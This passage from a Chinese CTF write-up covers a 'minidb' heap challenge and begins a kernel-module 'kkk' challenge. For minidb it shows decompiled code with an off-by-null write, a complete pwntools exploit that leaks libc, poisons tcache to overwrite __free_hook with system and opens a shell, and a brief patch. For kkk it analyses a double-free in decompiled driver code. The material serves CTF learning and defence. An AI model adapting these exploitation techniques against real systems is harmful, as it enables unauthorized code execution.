+<p>漏洞点在于编辑键值对的功能中，这里在读取用户输入后会先在键值对末尾放置 <code>&#39;\0&#39;</code> 后再检查长度，虽然限制了最大输入长度为 255 字符，但键值对的值长度有 <code>128</code> 和 <code>256</code> 两种类型，<strong>对于前者而言我们可以利用该漏洞完成一个堆上越界写 \0</strong>：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 __fastcall <span class="hljs-title function_">sub_1A81</span><span class="hljs-params">(_DWORD *a1)</span><br>&#123;<br>  <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [rsp+1Ch] [rbp-224h]</span><br>  __int64 v3; <span class="hljs-comment">// [rsp+20h] [rbp-220h] BYREF</span><br>  __int64 v4; <span class="hljs-comment">// [rsp+28h] [rbp-218h]</span><br>  <span class="hljs-type">char</span> s[<span class="hljs-number">520</span>]; <span class="hljs-comment">// [rsp+30h] [rbp-210h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v6; <span class="hljs-comment">// [rsp+238h] [rbp-8h]</span><br><br>  v6 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-keyword">if</span> ( a1 )<br>  &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Input the key: &quot;</span>);<br>    __isoc99_scanf(<span class="hljs-string">&quot;%ld&quot;</span>, &amp;v3);<br>    v4 = sub_168D(a1, v3, <span class="hljs-number">0LL</span>);<br>    <span class="hljs-keyword">if</span> ( v4 )<br>    &#123;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Input the new value: &quot;</span>);<br>      __isoc99_scanf(<span class="hljs-string">&quot;%255s&quot;</span>, s);<br>      v2 = <span class="hljs-built_in">strlen</span>(s);<br>      *(_BYTE *)(v4 + v2 + <span class="hljs-number">16</span>) = <span class="hljs-number">0</span>; <span class="hljs-comment">/* vulnerability here */</span><br>      <span class="hljs-keyword">if</span> ( (*a1 == <span class="hljs-number">1</span> || *a1 == <span class="hljs-number">2</span>) &amp;&amp; v2 &gt; <span class="hljs-number">127</span> || (*a1 == <span class="hljs-number">3</span> || *a1 == <span class="hljs-number">4</span>) &amp;&amp; v2 &gt; <span class="hljs-number">255</span> )<br>      &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\x1B[31m\x1B[1m[x] The length of new value is TOOOOOO LOOOOONG!\x1B[0m&quot;</span>);<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        <span class="hljs-built_in">memcpy</span>((<span class="hljs-type">void</span> *)(v4 + <span class="hljs-number">16</span>), s, v2);<br>        *(_BYTE *)(v4 + v2 + <span class="hljs-number">16</span>) = <span class="hljs-number">0</span>;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] Succesfully update the value of specific key!&quot;</span>);<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\x1B[31m\x1B[1m[x] Key NOT FOUND!\x1B[0m&quot;</span>);<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\x1B[31m\x1B[1m[x] Runtime error! No database provided!\x1B[0m&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v6;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>由于是签到题难度所以解法比较俗，简单风水一下利用越界写改一个数据库的 <code>database-&gt;name</code> 指向另一个 chunk，释放进 unsorted bin 利用 UAF read 泄露 libc 后重取释放回 tcache 后劫持 next 指针打 <code>__free_hook</code> 即可</p>
+<blockquote>
+<p>感觉也没啥好说的，毕竟本来就是签到题难度（</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment"># context.log_level = &#x27;debug&#x27;</span><br><br><span class="hljs-comment"># p = process(&#x27;./minidb&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, <span class="hljs-number">9999</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add_kv</span>(<span class="hljs-params">key:<span class="hljs-built_in">int</span>, value:<span class="hljs-built_in">bytes</span></span>):<br>    p.recvuntil(<span class="hljs-string">b&quot;Your choice: &quot;</span>)<br>    p.sendline(<span class="hljs-string">b&quot;1&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Input the key: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(key).encode())<br>    p.recvuntil(<span class="hljs-string">b&quot;Input the value: &quot;</span>)<br>    p.sendline(value)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">query_kv</span>(<span class="hljs-params">key:<span class="hljs-built_in">int</span></span>):<br>    p.recvuntil(<span class="hljs-string">b&quot;Your choice: &quot;</span>)<br>    p.sendline(<span class="hljs-string">b&quot;2&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Input the key: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(key).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">update_kv</span>(<span class="hljs-params">key:<span class="hljs-built_in">int</span>, value:<span class="hljs-built_in">bytes</span></span>):<br>    p.recvuntil(<span class="hljs-string">b&quot;Your choice: &quot;</span>)<br>    p.sendline(<span class="hljs-string">b&quot;3&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Input the key: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(key).encode())<br>    p.recvuntil(<span class="hljs-string">b&quot;Input the new value: &quot;</span>)<br>    p.sendline(value)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete_kv</span>(<span class="hljs-params">key:<span class="hljs-built_in">int</span></span>):<br>    p.recvuntil(<span class="hljs-string">b&quot;Your choice: &quot;</span>)<br>    p.sendline(<span class="hljs-string">b&quot;4&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Input the key: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(key).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exit_db</span>():<br>    p.recvuntil(<span class="hljs-string">b&quot;Your choice: &quot;</span>)<br>    p.sendline(<span class="hljs-string">b&quot;666&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create_db</span>(<span class="hljs-params"><span class="hljs-built_in">type</span>:<span class="hljs-built_in">int</span>, name:<span class="hljs-built_in">bytes</span></span>):<br>    p.recvuntil(<span class="hljs-string">b&quot;Your choice: &quot;</span>)<br>    p.sendline(<span class="hljs-string">b&quot;1&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Please input the name of database: &quot;</span>)<br>    p.sendline(name)<br>    p.recvuntil(<span class="hljs-string">b&quot;Please input the type of database: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">type</span>).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">use_db</span>(<span class="hljs-params">name:<span class="hljs-built_in">bytes</span></span>):<br>    p.recvuntil(<span class="hljs-string">b&quot;Your choice: &quot;</span>)<br>    p.sendline(<span class="hljs-string">b&quot;2&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Please input the name of database: &quot;</span>)<br>    p.sendline(name)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete_db</span>(<span class="hljs-params">name:<span class="hljs-built_in">bytes</span></span>):<br>    p.recvuntil(<span class="hljs-string">b&quot;Your choice: &quot;</span>)<br>    p.sendline(<span class="hljs-string">b&quot;3&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Please input the name of database: &quot;</span>)<br>    p.sendline(name)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">list_db</span>():<br>    p.recvuntil(<span class="hljs-string">b&quot;Your choice: &quot;</span>)<br>    p.sendline(<span class="hljs-string">b&quot;4&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">update_db_name</span>(<span class="hljs-params">orig_name:<span class="hljs-built_in">bytes</span>, new_name:<span class="hljs-built_in">bytes</span></span>):<br>    p.recvuntil(<span class="hljs-string">b&quot;Your choice: &quot;</span>)<br>    p.sendline(<span class="hljs-string">b&quot;5&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Please input the name of database: &quot;</span>)<br>    p.sendline(orig_name)<br>    p.recvuntil(<span class="hljs-string">b&quot;Please input the new name for database: &quot;</span>)<br>    p.sendline(new_name)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>    <span class="hljs-comment"># pre heap fengshui </span><br>    create_db(<span class="hljs-number">2</span>, <span class="hljs-string">b&quot;arttnba3&quot;</span>)<br>    use_db(<span class="hljs-string">b&quot;arttnba3&quot;</span>)<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>        add_kv(i, <span class="hljs-string">b&quot;arttnba3&quot;</span>)<br><br>    exit_db()<br><br>    create_db(<span class="hljs-number">2</span>, <span class="hljs-string">b&quot;arttnba4&quot;</span>)<br>    use_db(<span class="hljs-string">b&quot;arttnba4&quot;</span>)<br><br>    exit_db()<br><br>    use_db(<span class="hljs-string">b&quot;arttnba3&quot;</span>)<br><br>    add_kv(<span class="hljs-number">114514</span>, <span class="hljs-string">b&quot;rat3bant&quot;</span>) <span class="hljs-comment"># the victim</span><br>    add_kv(<span class="hljs-number">1919810</span>, <span class="hljs-string">b&quot;arttnba3&quot;</span>)<br>    delete_kv(<span class="hljs-number">1919810</span>)<br><br>    exit_db()<br><br>    delete_db(<span class="hljs-string">b&quot;arttnba4&quot;</span>)<br>    create_db(<span class="hljs-number">2</span>, <span class="hljs-string">b&quot;arttnba3&quot;</span> * (<span class="hljs-number">0x90</span> // <span class="hljs-number">8</span>)) <span class="hljs-comment"># reget 1919810</span><br><br>    use_db(<span class="hljs-string">b&quot;arttnba3&quot;</span>)<br>    update_kv(<span class="hljs-number">2</span>, <span class="hljs-string">b&#x27;A&#x27;</span> * (<span class="hljs-number">0x80</span> + <span class="hljs-number">0x10</span> + <span class="hljs-number">8</span>)) <span class="hljs-comment"># db-&gt;name is 114514 now</span><br><br>    <span class="hljs-comment"># fullfill the tcache</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>        add_kv(<span class="hljs-number">1919810</span> + i, <span class="hljs-string">b&#x27;arttnba3&#x27;</span>)<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>        delete_kv(<span class="hljs-number">1919810</span> + i)<br><br>    <span class="hljs-comment"># get an UAF unsorted chunk and leak libc</span><br>    delete_kv(<span class="hljs-number">114514</span>)<br>    exit_db()<br>    list_db()<br><br>    libc_leak = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>    main_arena = libc_leak - <span class="hljs-number">96</span><br>    __malloc_hook = main_arena - <span class="hljs-number">0x10</span><br>    libc_base = __malloc_hook - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>    log.info(<span class="hljs-string">&quot;Get libc addr leak: &quot;</span> + <span class="hljs-built_in">hex</span>(libc_leak))<br>    log.success(<span class="hljs-string">&quot;Libc base: &quot;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br><br>    <span class="hljs-comment"># reget the victim</span><br>    use_db(<span class="hljs-string">b&quot;arttnba3&quot;</span>)<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>        add_kv(<span class="hljs-number">1919810</span> + i, <span class="hljs-string">b&#x27;arttnba3&#x27;</span>)<br><br>    add_kv(<span class="hljs-number">114514</span>, <span class="hljs-string">b&quot;rat3bant&quot;</span>) <span class="hljs-comment"># the victim</span><br><br>    <span class="hljs-comment"># free the victim and leak heap base</span><br>    delete_kv(<span class="hljs-number">1919810</span> + <span class="hljs-number">6</span>)<br>    delete_kv(<span class="hljs-number">114514</span>)<br><br>    exit_db()<br>    list_db()<br>    p.recvuntil(<span class="hljs-string">b&#x27;\tarttnba3\n\t&#x27;</span>)<br>    heap_leak = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>    heap_base = heap_leak - <span class="hljs-number">0x1640</span><br>    log.info(<span class="hljs-string">&quot;Get heap addr leak: &quot;</span> + <span class="hljs-built_in">hex</span>(heap_leak))<br>    log.success(<span class="hljs-string">&quot;Heap base: &quot;</span> + <span class="hljs-built_in">hex</span>(heap_base))<br><br>    <span class="hljs-comment"># hijack the tcache list to __free_hook</span><br>    update_db_name(p64(heap_leak)[:<span class="hljs-number">6</span>], <br>                   p64(libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>] - <span class="hljs-number">0x88</span>) \<br>                   + <span class="hljs-string">b&quot;arttnba3&quot;</span> * ((<span class="hljs-number">0x90</span> // <span class="hljs-number">8</span>) - <span class="hljs-number">1</span>))<br><br>    <span class="hljs-comment"># overwrite __free_hook by dbname</span><br>    create_db(<span class="hljs-number">2</span>, <span class="hljs-string">b&quot;arttnba4&quot;</span> * (<span class="hljs-number">0x90</span> // <span class="hljs-number">8</span>))<br>    create_db(<span class="hljs-number">2</span>, <span class="hljs-string">b&quot;arttnba3&quot;</span> * ((<span class="hljs-number">0x90</span> // <span class="hljs-number">8</span>) - <span class="hljs-number">1</span>) \<br>                 + p64(libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]))<br><br>    <span class="hljs-comment"># trigger</span><br>    create_db(<span class="hljs-number">2</span>, <span class="hljs-string">b&quot;/bin/sh&quot;</span>)<br>    delete_db(<span class="hljs-string">b&quot;/bin/sh&quot;</span>)<br><br>    p.interactive()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    exp()<br><br></code></pre></td></tr></table></figure>
+
+<p>运行即可 get shell</p>
+<p><img src="https://s2.loli.net/2023/07/14/oxBjs2IzF83JucH.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>直接把多余的漏洞指令给 nop 掉即可</p>
+<p><img src="https://s2.loli.net/2023/07/07/SRjxs1QnDpKFowk.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p><img src="https://s2.loli.net/2023/07/07/XiDM3odbWxmpTRe.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<h1 id="0x02-kkk（困难）"><a href="#0x02-kkk（困难）" class="headerlink" title="0x02. kkk（困难）"></a>0x02. kkk（困难）</h1><p>不知道为啥没人 <code>break</code> 的一道题目，漏洞本身利用的空间也挺大的，而且都有好几个队伍 <code>fix</code> 成功了，怎么最后解开的队伍数量还是 0 呢  :（</p>
+<h2 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h2><p>题目提供了一个 <code>kkk.ko</code>，惯例拖入 IDA，其 <code>ioctl()</code> 只提供了两个功能——读取 <code>k2u</code> 队列与写入 <code>u2k</code> 队列：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">kkk_ioctl</span><span class="hljs-params">(__int64 a1, <span class="hljs-type">int</span> a2, __int64 a3)</span><br>&#123;<br>  mutex_lock(&amp;ioctl_lock);<br>  <span class="hljs-keyword">if</span> ( a2 == <span class="hljs-number">0x1919810</span> )<br>  &#123;<br>    kkk_write_u2k_queue(a3);<br>  &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( a2 == <span class="hljs-number">0x114514</span> )<br>  &#123;<br>    kkk_read_k2u_queue(a3);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    printk(&amp;unk_143E);<br>  &#125;<br>  mutex_unlock(&amp;ioctl_lock);<br>  <span class="hljs-keyword">return</span> _x86_return_thunk();<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>写入 <code>u2k</code> 队列首先会判断队列是否已满，之后分配一个 object 并将数据从用户空间拷贝到内核空间，这里我们可以看出在队列当中的每个 object 都应当带有一个 <code>header</code> ，在 <code>header</code> 之后才是真正的用户数据：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">kkk_write_u2k_queue</span><span class="hljs-params">(__int64 a1)</span><br>&#123;<br>  __int64 v1; <span class="hljs-comment">// r13</span><br>  __int64 v2; <span class="hljs-comment">// rax</span><br>  __int64 v3; <span class="hljs-comment">// r15</span><br>  <span class="hljs-type">unsigned</span> __int64 v4; <span class="hljs-comment">// r12</span><br>  __int64 v5; <span class="hljs-comment">// rbx</span><br>  __int64 v7[<span class="hljs-number">2</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-48h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v8; <span class="hljs-comment">// [rsp+10h] [rbp-38h]</span><br>  <span class="hljs-type">unsigned</span> __int64 v9; <span class="hljs-comment">// [rsp+18h] [rbp-30h]</span><br><br>  v9 = __readgsqword(<span class="hljs-number">0x28</span>u);<br>  v8 = <span class="hljs-number">0LL</span>;<br>  v7[<span class="hljs-number">1</span>] = <span class="hljs-number">0LL</span>;<br>  v7[<span class="hljs-number">0</span>] = <span class="hljs-number">0LL</span>;<br>  mutex_lock(&amp;u2k_lock);<br>  v1 = ((_WORD)u2k_tail + <span class="hljs-number">1</span>) &amp; <span class="hljs-number">0xFFF</span>;<br>  <span class="hljs-keyword">if</span> ( u2k_head != v1 &amp;&amp; !copy_from_user(v7, a1, <span class="hljs-number">24LL</span>) &amp;&amp; v8 &lt;= <span class="hljs-number">0xFFFFFFFFFFFFFFE7</span>LL )<br>  &#123;<br>    v2 = _kmalloc(v8 + <span class="hljs-number">24</span>, <span class="hljs-number">4197568LL</span>);<br>    <span class="hljs-keyword">if</span> ( v2 )<br>    &#123;<br>      v3 = v2;<br>      v4 = v8 + <span class="hljs-number">24</span>;<br>      <span class="hljs-keyword">if</span> ( ((v8 + <span class="hljs-number">24</span>) &amp; <span class="hljs-number">0xFFFFFFFF80000000</span>LL) != <span class="hljs-number">0</span> )<br>        BUG();<br>      _check_object_size(v2, v8 + <span class="hljs-number">24</span>, <span class="hljs-number">0LL</span>);<br>      <span class="hljs-keyword">if</span> ( copy_from_user(v3, a1, v4) )<br>      &#123;<br>        kfree(v3);<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        v5 = u2k_tail;<br>        <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> __int64)u2k_tail &gt;= <span class="hljs-number">0x1000</span> )<br>          _ubsan_handle_out_of_bounds(&amp;off_24B0, u2k_tail);<br>        u2k_queue[v5] = v3;<br>        u2k_tail = v1;<br>      &#125;<br>    &#125;<br>  &#125;<br>  mutex_unlock(&amp;u2k_lock);<br>  <span class="hljs-keyword">return</span> _x86_return_thunk();<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>读取 <code>k2u</code> 队列则是直接将队列中的 object 整个拷贝回用户空间，注意到这里存在一个漏洞：<strong>即使数据拷贝失败也会释放 object，但该 object 不会出队列，从而导致我们可以使得一个 object 被多次 free</strong>：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">kkk_read_k2u_queue</span><span class="hljs-params">(__int64 a1)</span><br>&#123;<br>  __int64 v1; <span class="hljs-comment">// rbx</span><br>  __int64 v2; <span class="hljs-comment">// rbx</span><br>  __int64 v3; <span class="hljs-comment">// r12</span><br>  __int64 v4; <span class="hljs-comment">// r14</span><br>  __int16 v5; <span class="hljs-comment">// ax</span><br><br>  mutex_lock(&amp;k2u_lock);<br>  v1 = k2u_head;<br>  <span class="hljs-keyword">if</span> ( k2u_head != k2u_tail )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> __int64)k2u_head &gt;= <span class="hljs-number">0x1000</span> )<br>      _ubsan_handle_out_of_bounds(&amp;off_24D0, k2u_head);<br>    v2 = k2u_queue[v1];<br>    <span class="hljs-keyword">if</span> ( !copy_to_user(a1, v2, <span class="hljs-number">24LL</span>) )<br>    &#123;<br>      v3 = *(_QWORD *)(v2 + <span class="hljs-number">16</span>);<br>      <span class="hljs-keyword">if</span> ( (v3 &amp; <span class="hljs-number">0xFFFFFFFF80000000</span>LL) != <span class="hljs-number">0</span> )<br>        BUG();<br>      _check_object_size(v2 + <span class="hljs-number">24</span>, *(_QWORD *)(v2 + <span class="hljs-number">16</span>), <span class="hljs-number">1LL</span>);<br>      <span class="hljs-keyword">if</span> ( !copy_to_user(a1 + <span class="hljs-number">24</span>, v2 + <span class="hljs-number">24</span>, v3) )<br>      &#123;<br>        v4 = k2u_head;<br>        v5 = k2u_head;<br>        <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> __int64)k2u_head &gt;= <span class="hljs-number">0x1000</span> )<br>        &#123;<br>          _ubsan_handle_out_of_bounds(&amp;off_24F0, k2u_head);<br>          v5 = k2u_head;<br>        &#125;<br>        k2u_queue[v4] = <span class="hljs-number">0LL</span>;<br>        k2u_head = (v5 + <span class="hljs-number">1</span>) &amp; <span class="hljs-number">0xFFF</span>;<br>      &#125;<br>    &#125;<br>    kfree(v2);<br>  &#125;<br>  mutex_unlock(&amp;k2u_lock);<br>  <span class="hljs-keyword">return</span> _x86_return_thunk();<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>那么读取 <code>u2k</code> 队列与写入 <code>k2u</code> 队列的功能在哪完成呢？让我们将目光放回初始化函数，在完成设备文件注册后其会启动一个 CPU 核心数个内核线程（本题为 1 个），该线程会执行函数 <code>kkk_msg_handler_fn()</code>，这个函数比较长我们一步一步来分析</p>
+<blockquote>
+<p>本来想弄多个内核线程的，但是这样难度好像又太高了点（笑），所以只弄了一个</p>
+</blockquote>
+<p>该函数整体是一个大循环，开头有个小循环内部会循环轮询 <code>u2k</code> 队列，若不为空则从中取出一个 object，若 object 开头的字段不为 <code>1</code> 则释放掉并重新继续循环：</p>
